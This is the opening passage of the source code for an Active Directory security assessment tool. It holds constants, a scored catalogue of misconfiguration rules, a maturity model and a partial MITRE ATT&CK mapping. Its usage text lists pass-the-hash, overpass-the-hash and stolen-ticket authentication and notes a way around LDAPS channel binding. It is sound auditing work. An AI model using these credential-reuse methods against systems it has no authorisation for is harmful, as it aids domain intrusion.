#!/usr/bin/env python3
"""
SCOUT - Security Configuration Observation & Understanding Tool
Active Directory security assessment for non-domain-joined Linux operators.

Four risk categories (Anomaly, Privileged, Stale, Trust) with 0-100 scoring,
a CMMI maturity model, MITRE ATT&CK mapping and modern-escalation
coverage (RBCD, constrained delegation, ADCS ESC, privileged SID-history). Data
is collected over LDAP/LDAPS; SMB/SYSVOL checks use impacket where available.
Outputs an interactive single-file HTML report plus JSON and CSV.

Auth options (impacket / bloodhound-python style):
  -u user -p pass         -d domain.local --dc-ip 10.0.0.1
  -u user -H :NThash      -d domain.local --dc-ip 10.0.0.1            (PtH)
  -u user -p pass  -k     -d domain.local --dc-ip 10.0.0.1           (request a TGT)
  -u user -H :NThash -k   -d domain.local --dc-ip 10.0.0.1   (overpass-the-hash)
  --aes-key <hex>         -d domain.local --dc-ip 10.0.0.1
  --ccache user.ccache    -d domain.local --dc-ip 10.0.0.1   (or KRB5CCNAME)
  --null-session          -d domain.local --dc-ip 10.0.0.1

Kerberos (-k) requests the ticket itself and binds with GSS-SPNEGO, which
satisfies "LDAP signing required" and — over plain 389 — bypasses LDAPS
channel binding (EPA). Use --save-ccache to keep the TGT for reuse.
"""

import argparse
import base64
import binascii
from binascii import unhexlify
import datetime
import hashlib
import html as html_mod
import io
import ipaddress
import json
import math
import os
import re
import socket
import ssl
import struct
import tempfile
import sys
import traceback
import xml.etree.ElementTree as ET
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

try:
    import ldap3
    from ldap3 import ALL, NTLM, SASL, GSSAPI, SIMPLE, Server, Connection, AUTO_BIND_NO_TLS, AUTO_BIND_TLS_BEFORE_BIND
    from ldap3.core.exceptions import LDAPException, LDAPBindError, LDAPSocketOpenError
    from ldap3.protocol.microsoft import security_descriptor_control
except ImportError:
    print("[-] ldap3 not installed: pip3 install ldap3")
    sys.exit(1)

try:
    from impacket.smbconnection import SMBConnection
    from impacket.nmb import NetBIOSTimeout
    HAS_IMPACKET_SMB = True
except ImportError:
    HAS_IMPACKET_SMB = False

try:
    from impacket.ldap import ldaptypes as _ldaptypes
    HAS_IMPACKET_LDAP = True
except ImportError:
    HAS_IMPACKET_LDAP = False

try:
    from Crypto.Cipher import AES
    HAS_PYCRYPTO = True
except ImportError:
    try:
        from Cryptodome.Cipher import AES
        HAS_PYCRYPTO = True
    except ImportError:
        HAS_PYCRYPTO = False

VERSION = "2.0.0"
TOOL_NAME = "SCOUT"
TOOL_LONG = "Security Configuration Observation & Understanding Tool"

# ── UAC flags ─────────────────────────────────────────────────────────────────
UAC_ACCOUNTDISABLE         = 0x00000002
UAC_PASSWD_NOTREQD         = 0x00000020
UAC_ENCRYPTED_TEXT_PWD     = 0x00000080  # reversible encryption
UAC_NORMAL_ACCOUNT         = 0x00000200
UAC_INTERDOMAIN_TRUST      = 0x00000800
UAC_WORKSTATION_TRUST      = 0x00001000
UAC_SERVER_TRUST           = 0x00002000
UAC_DONT_EXPIRE_PASSWORD   = 0x00010000
UAC_SMARTCARD_REQUIRED     = 0x00040000
UAC_TRUSTED_FOR_DELEGATION = 0x00080000  # unconstrained
UAC_NOT_DELEGATED          = 0x00100000
UAC_USE_DES_KEY_ONLY       = 0x00200000
UAC_DONT_REQUIRE_PREAUTH   = 0x00400000
UAC_TRUSTED_TO_AUTH        = 0x01000000  # protocol transition
UAC_PARTIAL_SECRETS        = 0x04000000  # RODC

# ── Trust attributes ──────────────────────────────────────────────────────────
TRUST_ATTR_QUARANTINED      = 0x00000004  # SID filtering
TRUST_ATTR_FOREST           = 0x00000008
TRUST_ATTR_CROSS_ORG        = 0x00000010  # selective auth
TRUST_ATTR_WITHIN_FOREST    = 0x00000020
TRUST_ATTR_TREAT_EXTERNAL   = 0x00000040
TRUST_ATTR_RC4              = 0x00000080
TRUST_ATTR_TGT_DELEGATION   = 0x00000800
TRUST_TYPE_DOWNLEVEL        = 1
TRUST_DIR_DISABLED          = 0
TRUST_DIR_INBOUND           = 1
TRUST_DIR_OUTBOUND          = 2
TRUST_DIR_BIDIRECT          = 3

# ── FILETIME constants ────────────────────────────────────────────────────────
FILETIME_NEVER = 9223372036854775807  # 0x7FFFFFFFFFFFFFFF
FILETIME_ZERO  = 0

# ── Schema / functional levels ────────────────────────────────────────────────
SCHEMA_VERSIONS = {13:"2000",30:"2003",31:"2003R2",44:"2008",47:"2008R2",
                   56:"2012",69:"2012R2",81:"2016",87:"2019",88:"2022"}
FUNCTIONAL_LEVELS = {0:"2000",1:"2003 Interim",2:"2003",3:"2008",
                     4:"2008R2",5:"2012",6:"2012R2",7:"2016/2019/2022"}

# ── Rule catalogue: id -> (title, category, points, severity) ─────────────────
# severity: INFO LOW MEDIUM HIGH CRITICAL
RULES: Dict[str, Tuple[str, str, int, str]] = {
    # Anomaly
    "A-Krbtgt":               ("Krbtgt password not changed in >180 days","Anomaly",25,"HIGH"),
    "A-LAPS-Not-Installed":   ("LAPS not installed (no schema attribute)","Anomaly",10,"MEDIUM"),
    "A-LAPS-Joined-Computers":("Domain computers without LAPS password set","Anomaly",10,"MEDIUM"),
    "A-NullSession":          ("Null session authentication allowed","Anomaly",15,"HIGH"),
    "A-PreWin2000Anonymous":  ("Pre-Win2000 Compatible Access contains anonymous","Anomaly",20,"HIGH"),
    "A-PreWin2000AuthenticatedUsers":("Pre-Win2000 group contains Authenticated Users","Anomaly",10,"MEDIUM"),
    "A-PreWin2000Other":      ("Pre-Win2000 group has non-standard members","Anomaly",10,"MEDIUM"),
    "A-Guest":                ("Built-in Guest account is enabled","Anomaly",10,"MEDIUM"),
    "A-MinPwdLen":            ("Minimum password length < 8 characters","Anomaly",5,"LOW"),
    "A-ReversiblePwd":        ("Accounts with reversible password encryption","Anomaly",15,"HIGH"),
    "A-LMHashAuthorized":     ("LM hash storage not disabled","Anomaly",25,"CRITICAL"),
    "A-AeA":                  ("AES encryption not required for Kerberos","Anomaly",5,"LOW"),
    "A-DsHeuristicsAnonymous":("Anonymous LDAP operations allowed","Anomaly",25,"HIGH"),
    "A-DsHeuristicsLDAPSecurity":("LDAP security heuristics weakened","Anomaly",10,"MEDIUM"),
    "A-DsHeuristicsAllowAnonNSPI":("Anonymous NSPI access allowed","Anomaly",10,"MEDIUM"),
    "A-LDAPSigningDisabled":  ("LDAP signing not required (GPO)","Anomaly",15,"HIGH"),
    "A-DCLdapSign":           ("LDAP signing not enforced on DC","Anomaly",15,"HIGH"),
    "A-DCLdapsProtocol":      ("LDAPS uses weak TLS (1.0/1.1)","Anomaly",10,"MEDIUM"),
    "A-DCLdapsChannelBinding":("LDAPS channel binding not enabled","Anomaly",15,"HIGH"),
    "A-DCLdapsProtocolAdvanced":("LDAPS advanced protocol weakness","Anomaly",10,"MEDIUM"),
    "A-SMB2SignatureNotEnabled":("SMB2 signing not enabled on DC","Anomaly",25,"CRITICAL"),
    "A-SMB2SignatureNotRequired":("SMB2 signing not required on DC","Anomaly",15,"HIGH"),
    "A-RootDseAnonBinding":   ("Anonymous LDAP binding allowed","Anomaly",10,"MEDIUM"),
    "A-MembershipEveryone":   ("Everyone/Authenticated Users in privileged group","Anomaly",100,"CRITICAL"),
    "A-ProtectedUsers":       ("Protected Users group not used for privileged accounts","Anomaly",10,"MEDIUM"),
    "A-PwdGPO":               ("Weak password policy enforced via GPO","Anomaly",10,"MEDIUM"),
    "A-PwdComplexity":        ("Password complexity not required","Anomaly",10,"MEDIUM"),
    "A-PwdHistory":           ("Password history length below recommended","Anomaly",5,"LOW"),
    "A-PwdMaxAge":            ("Password maximum age not enforced","Anomaly",5,"LOW"),
    "A-NoGPOLLMNR":           ("LLMNR not disabled via GPO","Anomaly",10,"MEDIUM"),
    "A-NoNetSessionHardening":("NetSessionEnum hardening not enabled","Anomaly",15,"HIGH"),
    "A-DC-Spooler":           ("Print Spooler service enabled on DC","Anomaly",25,"HIGH"),
    "A-DC-WebClient":         ("WebClient service enabled on DC","Anomaly",25,"HIGH"),
    "A-DC-Coerce":            ("DC coercion vector present (Spooler or WebClient)","Anomaly",30,"CRITICAL"),
    "A-DCRefuseComputerPwdChange":("DC refuses computer password change","Anomaly",5,"LOW"),
    "A-DnsZoneUpdate1":       ("DNS zone allows unsecured dynamic updates","Anomaly",25,"HIGH"),
    "A-DnsZoneUpdate2":       ("DNS zone update policy insecure","Anomaly",10,"MEDIUM"),
    "A-DnsZoneTransfert":     ("DNS zone transfer unrestricted","Anomaly",10,"MEDIUM"),
    "A-DnsZoneAUCreateChild": ("Authenticated Users can create DNS child objects","Anomaly",10,"MEDIUM"),
    "A-NotEnoughDC":          ("Fewer than 2 domain controllers","Anomaly",5,"LOW"),
    "A-NTFRSOnSysvol":        ("SYSVOL still using deprecated NTFRS","Anomaly",5,"LOW"),
    "A-SmartCardPwdRotation": ("Smart-card accounts lack 60-day password rotation","Anomaly",5,"LOW"),
    "A-SmartCardRequired":    ("Privileged accounts lack smart-card enforcement","Anomaly",5,"LOW"),
    "A-AdminSDHolder":        ("AdminSDHolder ACL inconsistency detected","Anomaly",25,"HIGH"),
    "A-CertEnrollHttp":       ("ADCS enrollment available over plain HTTP","Anomaly",30,"CRITICAL"),
    "A-CertEnrollChannelBinding":("ADCS enrollment channel binding not configured","Anomaly",25,"HIGH"),
    "A-CertTempAgent":        ("Certificate template: agent enrollment abuse (ESC3)","Anomaly",50,"CRITICAL"),
    "A-CertTempAnyone":       ("Certificate template: any principal can enroll","Anomaly",40,"CRITICAL"),
    "A-CertTempAnyPurpose":   ("Certificate template: Any Purpose EKU (ESC2)","Anomaly",40,"CRITICAL"),
    "A-CertTempCustomSubject":("Certificate template: requester-supplied SAN (ESC1)","Anomaly",50,"CRITICAL"),
    "A-CertTempNoSecurity":   ("Certificate template: no security applied","Anomaly",50,"CRITICAL"),
    "A-CertROCA":             ("ROCA weak RSA key in certificate","Anomaly",30,"CRITICAL"),
    "A-CertWeakDSA":          ("Weak DSA key in certificate","Anomaly",10,"MEDIUM"),
    "A-CertWeakRsaComponent": ("Weak RSA component in certificate","Anomaly",25,"HIGH"),
    "A-BadSuccessor":         ("dMSA bad-successor attack delegation exists","Anomaly",50,"CRITICAL"),
    "A-WeakRSARootCert":      ("Root CA uses weak RSA (<2048-bit)","Anomaly",10,"MEDIUM"),
    "A-WeakRSARootCert2":     ("Intermediate CA uses weak RSA key","Anomaly",10,"MEDIUM"),
    "A-SHA1RootCert":         ("Root CA uses SHA-1 signature","Anomaly",5,"LOW"),
    "A-MD5RootCert":          ("Root CA uses MD5 signature","Anomaly",15,"HIGH"),
    "A-MD5IntermediateCert":  ("Intermediate CA uses MD5 signature","Anomaly",15,"HIGH"),
    "A-SHA0RootCert":         ("Root CA uses SHA-0 signature","Anomaly",25,"HIGH"),
    "A-NoServicePolicy":      ("No service account policy enforced","Anomaly",5,"LOW"),
    "A-BackupMetadata":       ("Backup metadata/tombstone accessible","Anomaly",10,"MEDIUM"),
    "A-AuditDC":              ("Insufficient audit policy on domain controllers","Anomaly",5,"LOW"),
    "A-AuditPowershell":      ("PowerShell script block logging not enabled","Anomaly",5,"LOW"),
    "A-AnonymousAuthorizedGPO":("Anonymous principal authorised on GPO","Anomaly",15,"HIGH"),
    "A-LimitBlankPasswordUse":("Blank passwords accessible from network","Anomaly",25,"HIGH"),
    "A-WSUS-SslProtocol":     ("WSUS using weak SSL/TLS protocol","Anomaly",10,"MEDIUM"),
    # Privileged
    "P-AdminNum":             ("Excessive domain administrator accounts","Privileged",25,"HIGH"),
    "P-AdminPwdTooOld":       ("Admin account password not changed in >90 days","Privileged",25,"HIGH"),
    "P-AdminLogin":           ("Admin accounts that have never logged in","Privileged",5,"LOW"),
    "P-AdminEmailOn":         ("Admin accounts with email attributes","Privileged",5,"LOW"),
    "P-Inactive":             ("Inactive privileged accounts (>180 days)","Privileged",25,"HIGH"),
    "P-Kerberoasting":        ("Privileged accounts with SPN (Kerberoastable)","Privileged",25,"HIGH"),
    "P-UnconstrainedDelegation":("Unconstrained delegation on non-DC account","Privileged",100,"CRITICAL"),
    "P-UnkownDelegation":     ("Misconfigured or unknown delegation type","Privileged",25,"HIGH"),
    "P-DelegationDCt2a4d":    ("DC account trusted for protocol transition (T2A4D)","Privileged",50,"CRITICAL"),
    "P-DelegationDCa2d2":     ("DC account A2D2 delegation","Privileged",50,"CRITICAL"),
    "P-DelegationDCsourcedeleg":("DC source delegation misconfigured","Privileged",25,"HIGH"),
    "P-DelegationEveryone":   ("Everyone principal has delegation rights","Privileged",50,"CRITICAL"),
    "P-DelegationKeyAdmin":   ("Key Admin delegation misconfigured","Privileged",50,"CRITICAL"),
    "P-DelegationGPOData":    ("GPO data delegation grants excessive access","Privileged",25,"HIGH"),
    "P-DelegationLoginScript":("Login script delegation misconfigured","Privileged",25,"HIGH"),
    "P-DelegationFileDeployed":("File deployment delegation","Privileged",25,"HIGH"),
    "P-DangerousExtendedRight":("Dangerous extended rights on AD object","Privileged",50,"CRITICAL"),
    "P-ControlPathIndirectEveryone":("Everyone has indirect control path to admin","Privileged",50,"CRITICAL"),
    "P-ControlPathIndirectMany":("Many users have indirect control path to admin","Privileged",25,"HIGH"),
    "P-DNSAdmin":             ("DNSAdmins group has members","Privileged",15,"HIGH"),
    "P-DNSDelegation":        ("DNS delegation object misconfigured","Privileged",25,"HIGH"),
    "P-ExchangePrivEsc":      ("Exchange configuration allows privilege escalation","Privileged",50,"CRITICAL"),
    "P-ExchangeAdminSDHolder":("Exchange groups in AdminSDHolder scope","Privileged",25,"HIGH"),
    "P-RODCAdminRevealed":    ("Privileged account credential revealed to RODC","Privileged",25,"HIGH"),
    "P-RODCKrbtgtOrphan":     ("Orphaned RODC krbtgt account","Privileged",10,"MEDIUM"),
    "P-RODCSYSVOLWrite":      ("RODC has write access to SYSVOL","Privileged",50,"CRITICAL"),
    "P-RODCNeverReveal":      ("RODC msDS-NeverRevealGroup not configured","Privileged",5,"LOW"),
    "P-RODCRevealOnDemand":   ("RODC reveal-on-demand includes privileged accounts","Privileged",10,"MEDIUM"),
    "P-RODCAllowedGroup":     ("RODC allowed group not configured","Privileged",5,"LOW"),
    "P-RODCDeniedGroup":      ("RODC denied group not configured","Privileged",5,"LOW"),
    "P-ServiceDomainAdmin":   ("Service account is member of Domain Admins","Privileged",50,"CRITICAL"),
    "P-SchemaAdmin":          ("Schema Admins group is not empty","Privileged",25,"HIGH"),
    "P-RecycleBin":           ("AD Recycle Bin not enabled","Privileged",5,"LOW"),
    "P-ProtectedUsers":       ("Privileged accounts not in Protected Users group","Privileged",10,"MEDIUM"),
    "P-LogonDenied":          ("Admin accounts not restricted by deny-logon GPO","Privileged",10,"MEDIUM"),
    "P-LoginDCEveryone":      ("Everyone allowed interactive logon to DC","Privileged",25,"HIGH"),
    "P-OperatorsEmpty":       ("Built-in operator groups are empty (controls missing)","Privileged",5,"LOW"),
    "P-PrivilegeEveryone":    ("Sensitive privilege assigned to Everyone","Privileged",50,"CRITICAL"),
    "P-UnprotectedOU":        ("OUs without accidental-deletion protection","Privileged",5,"LOW"),
    "P-RecoveryModeUnprotected":("DSRM password not set/protected","Privileged",25,"HIGH"),
    "P-TrustedCredManAccessPrivilege":("SeTrustedCredManAccessPrivilege granted","Privileged",25,"HIGH"),
    "P-DsHeuristicsAdminSDExMask":("AdminSDHolder exclusion mask weakened","Privileged",10,"MEDIUM"),
    "P-DsHeuristicsDoListObject":("List-Object mode disabled","Privileged",5,"LOW"),
    "P-DisplaySpecifier":     ("Display specifier abuse possible","Privileged",25,"HIGH"),
    "P-Delegated":            ("Non-standard delegation on AD object","Privileged",15,"MEDIUM"),
    # Stale
    "S-Inactive":             ("User accounts inactive >180 days","Stale",5,"LOW"),
    "S-C-Inactive":           ("Computer accounts inactive >45 days","Stale",5,"LOW"),
    "S-DC-Inactive":          ("Domain controller account inactive","Stale",25,"HIGH"),
    "S-DC-NotUpdated":        ("Domain controllers not patched recently","Stale",10,"MEDIUM"),
    "S-PwdNeverExpires":      ("Accounts with password set to never expire","Stale",5,"LOW"),
    "S-PwdNotRequired":       ("Accounts where no password is required","Stale",15,"HIGH"),
    "S-Reversible":           ("User accounts with reversible encryption","Stale",15,"HIGH"),
    "S-DesEnabled":           ("Accounts with DES-only encryption","Stale",15,"HIGH"),
    "S-NoPreAuth":            ("User accounts without Kerberos pre-auth","Stale",15,"HIGH"),
    "S-NoPreAuthAdmin":       ("Admin accounts without Kerberos pre-auth","Stale",25,"CRITICAL"),
    "S-SIDHistory":           ("Accounts with SID history set","Stale",10,"MEDIUM"),
    "S-PwdLastSet-45":        ("Enabled accounts with password >45 days old","Stale",5,"LOW"),
    "S-PwdLastSet-90":        ("Enabled accounts with password >90 days old","Stale",5,"LOW"),
    "S-PwdLastSet-DC":        ("DC computer account password >45 days old","Stale",25,"HIGH"),
    "S-PwdLastSet-Cluster":   ("Cluster account password >45 days old","Stale",5,"LOW"),
    "S-FunctionalLevel1":     ("Domain/Forest functional level 2003 or below","Stale",25,"HIGH"),
    "S-FunctionalLevel3":     ("Domain/Forest functional level 2008","Stale",10,"MEDIUM"),
    "S-FunctionalLevel4":     ("Domain/Forest functional level 2008 R2","Stale",5,"LOW"),
    "S-OS-XP":                ("Windows XP/Server 2003 computers in domain","Stale",25,"HIGH"),
    "S-OS-Vista":             ("Windows Vista/Server 2008 computers in domain","Stale",15,"HIGH"),
    "S-OS-NT":                ("NT4-era OS present in domain","Stale",25,"CRITICAL"),
    "S-OS-W10":               ("End-of-life Windows 10 builds present","Stale",5,"LOW"),
    "S-SMB-v1":               ("SMBv1 enabled on domain controller","Stale",25,"HIGH"),
    "S-Duplicate":            ("Duplicate (CNF:) accounts detected","Stale",5,"LOW"),
    "S-Domain$$$":            ("Orphaned Domain$$$ accounts present","Stale",5,"LOW"),
    "S-AesNotEnabled":        ("Accounts without AES encryption types","Stale",5,"LOW"),
    "S-PrimaryGroup":         ("Users with non-default primary group","Stale",5,"LOW"),
    "S-C-PrimaryGroup":       ("Computers with non-default primary group","Stale",5,"LOW"),
    "S-C-Reversible":         ("Computer accounts with reversible encryption","Stale",10,"MEDIUM"),
    "S-DC-SubnetMissing":     ("DC IP not covered by any AD Sites subnet","Stale",5,"LOW"),
    "S-DefaultOUChanged":     ("Default computer OU changed from standard","Stale",5,"LOW"),
    "S-KerberosArmoring":     ("Kerberos FAST/armoring not enabled","Stale",5,"LOW"),
    "S-KerberosArmoringDC":   ("Kerberos armoring not required on DCs","Stale",5,"LOW"),
    "S-JavaSchema":           ("Java/COM schema extensions present","Stale",5,"LOW"),
    "S-TerminalServicesGPO":  ("Deprecated Terminal Services settings in GPO","Stale",5,"LOW"),
    "S-Vuln-MS14-068":        ("Domain may be vulnerable to MS14-068 (PAC forgery)","Stale",100,"CRITICAL"),
    "S-Vuln-MS17_010":        ("Host vulnerable to MS17-010 (EternalBlue)","Stale",100,"CRITICAL"),
    "S-ADRegistration":       ("AD registration schema inconsistency","Stale",5,"LOW"),
    "S-WSUS-HTTP":            ("WSUS server uses unencrypted HTTP","Stale",25,"HIGH"),
    "S-WSUS-NoPinning":       ("WSUS no certificate pinning","Stale",10,"MEDIUM"),
    "S-WSUS-UserProxy":       ("WSUS uses user-context proxy","Stale",10,"MEDIUM"),
    "S-DefenderASR":          ("Defender ASR rules not configured","Stale",5,"LOW"),
    "S-FirewallScript":       ("Firewall script deployed via logon GPO","Stale",5,"LOW"),
    "S-FolderOptions":        ("Hidden file options controlled via GPO","Stale",5,"LOW"),
    # Trust
    "T-Inactive":             ("Trust relationship has not been used recently","Trust",5,"LOW"),
    "T-Downlevel":            ("NT4-style (downlevel) trust present","Trust",10,"MEDIUM"),
    "T-SIDFiltering":         ("SID filtering not enabled on trust","Trust",25,"HIGH"),
    "T-SIDHistoryDangerous":  ("Dangerous SID history across trust boundary","Trust",50,"CRITICAL"),
    "T-SIDHistorySameDomain": ("SID history within same domain","Trust",10,"MEDIUM"),
    "T-SIDHistoryUnknownDomain":("SID history from unrecognised domain","Trust",10,"MEDIUM"),
    "T-TGTDelegation":        ("TGT delegation enabled on trust","Trust",50,"CRITICAL"),
    "T-AzureADSSO":           ("Azure AD Seamless SSO account misconfigured","Trust",25,"HIGH"),
    "T-ScriptOutOfDomain":    ("Login scripts referenced from outside the domain","Trust",10,"MEDIUM"),
    "T-FileDeployedOutOfDomain":("Files deployed from untrusted external domain","Trust",10,"MEDIUM"),
    "T-Dc":                   ("Trust target DC has issues","Trust",10,"MEDIUM"),
    # GPO / SYSVOL
    "P-GPPPassword":          ("GPP password (cpassword) found in SYSVOL","Privileged",100,"CRITICAL"),
    "P-ModifiableGPO":        ("GPO DACL allows broad principal write access","Privileged",75,"CRITICAL"),
    "P-DCSync":               ("Non-admin principal has DCSync rights on domain root","Privileged",100,"CRITICAL"),
    "P-DangerousACLDomain":   ("Broad principal has WriteDACL/WriteOwner/GenericAll on domain root","Privileged",100,"CRITICAL"),
    "P-DangerousACLDA":       ("Broad principal can write to Domain Admins group","Privileged",100,"CRITICAL"),
    "P-DangerousACLGPO":      ("Broad principal can modify high-value GPO","Privileged",75,"CRITICAL"),
    "P-MachineAccountQuota":  ("ms-DS-MachineAccountQuota > 0 (any user can add machine accounts)","Privileged",25,"HIGH"),
    "P-OwnsPrivObject":       ("Broad principal owns a privileged AD object","Privileged",50,"CRITICAL"),
    "P-WriteToPrivGroup":     ("Broad principal can add members to privileged group","Privileged",100,"CRITICAL"),
    "A-WDigest":              ("WDigest UseLogonCredential enabled via GPO","Anomaly",50,"CRITICAL"),
    "A-LMCompatibilityLevel": ("LmCompatibilityLevel < 3 via GPO (NTLMv1 allowed)","Anomaly",50,"CRITICAL"),
    "A-LLMNR":                ("LLMNR not disabled via GPO","Anomaly",25,"HIGH"),
    "A-NBTNSDisabled":        ("NetBIOS Name Service not disabled via GPO","Anomaly",15,"MEDIUM"),
    "A-CredentialGuard":      ("Credential Guard not configured via GPO","Anomaly",10,"MEDIUM"),
    "A-HardenedPaths":        ("UNC hardened paths not configured via GPO","Anomaly",25,"HIGH"),
    "A-PowerShellLogging":    ("PowerShell script block logging not enabled","Anomaly",10,"MEDIUM"),
    "A-PowerShellTranscript": ("PowerShell transcription not enabled","Anomaly",5,"LOW"),
    "A-WSUS-HTTP":            ("WSUS WUServer using HTTP (not HTTPS)","Anomaly",25,"HIGH"),
    "A-LocalAdminPassword":   ("LAPS not deployed — local admin passwords unmanaged","Anomaly",50,"CRITICAL"),
    "A-PrivilegeAudit":       ("Audit Policy not configured via GPO","Anomaly",15,"MEDIUM"),
    "S-Kerberoastable":       ("Kerberoastable accounts with weak encryption","Stale",25,"HIGH"),
    "S-KerberoastableAdmin":  ("Kerberoastable admin accounts","Stale",100,"CRITICAL"),
    # ── Added in v2 — modern escalation & hardening coverage ──────────────────
    "P-RBCD":                 ("Resource-based constrained delegation configured on account","Privileged",25,"HIGH"),
    "P-RBCD-Dangerous":       ("RBCD configured on a domain controller / Tier-0 object","Privileged",100,"CRITICAL"),
    "P-ConstrainedDelegService":("Constrained delegation (S4U2Proxy) on a service account","Privileged",25,"HIGH"),
    "P-ComputerInPrivGroup":  ("Computer account is a member of a privileged group","Privileged",50,"CRITICAL"),
    "P-AdminCountOrphan":     ("Orphaned adminCount=1 objects (former privilege, restrictive ACL)","Privileged",10,"MEDIUM"),
    "S-SIDHistoryPrivileged": ("SID history references a privileged / built-in SID","Privileged",75,"CRITICAL"),
    "A-RestrictRemoteSAM":    ("RestrictRemoteSAM not enforced (anonymous SAM enumeration)","Anomaly",10,"MEDIUM"),
    "A-NTLMAudit":            ("NTLM auditing not enabled (RestrictSendingNTLMTraffic)","Anomaly",5,"LOW"),
    "A-DSRMLogon":            ("DSRM administrator allowed to log on over the network","Anomaly",25,"HIGH"),
    "A-CertTemplateESC4":     ("Certificate template ACL writable by low-privileged principal (ESC4)","Anomaly",50,"CRITICAL"),
}

# Field/army palette — oxide red, rust, mustard/brass, olive drab, field grey.
SEV_COLOUR = {"CRITICAL":"#b23a2e","HIGH":"#c2702a","MEDIUM":"#c9a227",
              "LOW":"#6f8f3f","INFO":"#8a8f78"}
CAT_COLOUR  = {"Anomaly":"#c2702a","Privileged":"#a8843c",
               "Stale":"#5d7a86","Trust":"#6f8f3f"}

# ── Maturity model (CMMI 1-5, ANSSI-style) ───────────────────────────────────
# 1 = INITIAL (instantly exploitable / catastrophic hygiene gap) .. 5 = OPTIMIZING.
# The domain's achieved maturity = the LOWEST level among all still-failing rules,
# so one unfixed level-1 issue pins the whole domain at level 1.
# Default maturity is derived from severity; this table overrides specific rules.
SEV_TO_MATURITY = {"CRITICAL":1, "HIGH":2, "MEDIUM":3, "LOW":4, "INFO":5}
MATURITY_LABEL = {1:"Initial", 2:"Repeatable", 3:"Defined",
                  4:"Managed", 5:"Optimizing"}
MATURITY_DESC = {
    1: "AD security is unpredictable and ad-hoc. Instantly-exploitable issues "
       "remain — an attacker on the LAN can likely reach Domain Admin today.",
    2: "Basic checks happen but key serious misconfigurations persist. Internal "
       "trust hygiene and the overall risk score need to come down.",
    3: "Monitoring and hardening are defined: legacy protocols removed, admin "
       "tiering and logon restrictions in place.",
    4: "Controls are measured and managed; detection and prevention are effective "
       "(SOC rules, security GPOs, smart-card 2FA, bastion).",
    5: "Continuous improvement and threat hunting. Persistence and cross-domain "
       "movement are actively detected; ACL paths are analysed.",
}
RULE_MATURITY: Dict[str, int] = {
    # Level 1 — fix immediately (domain-takeover class)
    "A-MembershipEveryone":1, "A-LMHashAuthorized":1, "A-LMCompatibilityLevel":1,
    "A-WDigest":1, "P-GPPPassword":1, "P-DCSync":1, "P-DangerousACLDomain":1,
    "P-DangerousACLDA":1, "P-WriteToPrivGroup":1, "P-OwnsPrivObject":1,
    "P-ModifiableGPO":1, "P-DangerousACLGPO":1, "P-ServiceDomainAdmin":1,
    "P-UnconstrainedDelegation":1, "A-CertTempCustomSubject":1, "A-CertTempNoSecurity":1,
    "A-CertTempAnyone":1, "A-CertTempAnyPurpose":1, "A-CertTempAgent":1,
    "A-CertEnrollHttp":1, "A-CertTemplateESC4":1,
    "S-KerberoastableAdmin":1, "S-NoPreAuthAdmin":1, "S-Vuln-MS14-068":1,
    "S-Vuln-MS17_010":1, "A-DC-Coerce":1, "A-MD5RootCert":1, "A-SHA0RootCert":1,
    "A-BadSuccessor":1, "T-SIDHistoryDangerous":1, "T-TGTDelegation":1,
    "P-DelegationEveryone":1, "P-DelegationKeyAdmin":1, "P-DelegationDCt2a4d":1,
    "P-DelegationDCa2d2":1, "P-DangerousExtendedRight":1, "P-ControlPathIndirectEveryone":1,
    "P-PrivilegeEveryone":1, "P-RBCD-Dangerous":1, "P-ComputerInPrivGroup":1,
    "S-SIDHistoryPrivileged":1, "A-Krbtgt":1, "P-ExchangePrivEsc":1,
    # Level 2 — serious
    "P-Kerberoasting":2, "S-Kerberoastable":2, "P-MachineAccountQuota":2,
    "A-NullSession":2, "A-PreWin2000Anonymous":2, "A-DCLdapSign":2,
    "A-DCLdapsChannelBinding":2, "A-SMB2SignatureNotEnabled":2, "A-SMB2SignatureNotRequired":2,
    "A-LDAPSigningDisabled":2, "A-ReversiblePwd":2, "S-Reversible":2, "S-C-Reversible":2,
    "A-DsHeuristicsAnonymous":2, "S-NoPreAuth":2, "T-SIDFiltering":2, "A-AdminSDHolder":2,
    "A-DnsZoneUpdate1":2, "A-DnsZoneAUCreateChild":2, "A-DC-Spooler":2, "A-DC-WebClient":2,
    "P-DNSAdmin":2, "S-DesEnabled":2, "P-RBCD":2, "P-ConstrainedDelegService":2,
    "P-AdminCountOrphan":2, "A-CertROCA":2, "P-Inactive":2,
    "A-CertWeakRsaComponent":2, "P-SchemaAdmin":2, "A-RestrictRemoteSAM":2,
    # Level 3 — hardening
    "A-LLMNR":3, "A-NBTNSDisabled":3, "A-HardenedPaths":3, "A-CredentialGuard":3,
    "P-AdminNum":3, "P-AdminPwdTooOld":3, "S-SMB-v1":3, "A-MinPwdLen":3,
    "A-PwdComplexity":3, "P-ProtectedUsers":3, "A-NTLMAudit":3, "A-Guest":3,
    "S-OS-XP":3, "S-OS-Vista":3, "S-OS-NT":3, "P-LogonDenied":3, "A-DSRMLogon":3,
    # Level 4 — managed
    "A-AuditDC":4, "A-AuditPowershell":4, "A-PowerShellLogging":4, "P-RecycleBin":4,
    "S-KerberosArmoring":4, "A-PrivilegeAudit":4, "A-PowerShellTranscript":4,
    "A-BackupMetadata":4, "S-FunctionalLevel4":4,
    # Level 5 — optimizing / minor
    "A-NotEnoughDC":5, "S-DC-SubnetMissing":5, "P-UnprotectedOU":5, "S-PrimaryGroup":5,
    "S-C-PrimaryGroup":5, "S-Duplicate":5, "S-Domain$$$":5, "P-OperatorsEmpty":5,
}

def rule_maturity(rule_id: str, severity: str) -> int:
    return RULE_MATURITY.get(rule_id, SEV_TO_MATURITY.get(severity, 3))

# ── MITRE ATT&CK technique mapping (rule_id -> ["Txxxx[.yyy]: Name", …]) ───────
RULE_MITRE: Dict[str, List[str]] = {
    "A-Krbtgt": ["T1558.001: Golden Ticket"],
    "S-Kerberoastable": ["T1558.003: Kerberoasting"],
    "S-KerberoastableAdmin": ["T1558.003: Kerberoasting"],
    "P-Kerberoasting": ["T1558.003: Kerberoasting"],
    "S-NoPreAuth": ["T1558.004: AS-REP Roasting"],
    "S-NoPreAuthAdmin": ["T1558.004: AS-REP Roasting"],
    "P-DCSync": ["T1003.006: DCSync"],
    "P-DangerousACLDomain": ["T1003.006: DCSync", "T1222.001: ACL Modification"],
    "A-ReversiblePwd": ["T1003: OS Credential Dumping"],
    "S-Reversible": ["T1003: OS Credential Dumping"],
    "A-LMHashAuthorized": ["T1003: OS Credential Dumping"],
